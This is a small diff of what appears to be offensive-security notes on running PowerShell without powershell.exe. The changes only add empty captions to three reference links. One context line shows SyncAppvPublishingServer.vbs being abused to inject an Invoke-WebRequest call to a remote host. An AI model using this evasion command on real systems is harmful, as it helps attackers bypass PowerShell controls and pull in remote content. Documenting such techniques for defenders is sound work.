@@ -28,9 +28,9 @@ SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 
 ## References
 
-{% embed url="https://github.com/p3nt4/PowerShdll" %}
+{% embed url="https://github.com/p3nt4/PowerShdll" caption="" %}
 
-{% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}
+{% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" caption="" %}
 
-{% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}
+{% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" caption="" %}
 
